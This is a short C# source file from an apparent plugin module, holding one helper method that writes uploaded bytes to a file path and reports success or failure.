using System;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Plugin
{
    internal class UploadFile
    {
        internal static bool WriteUploadedFile(string path, byte[] file) 
        {
            try
            {
                System.IO.File.WriteAllBytes(path, file);
                return true;
            }
            catch (Exception)
            {
                return false;
            }
        }
    }
}
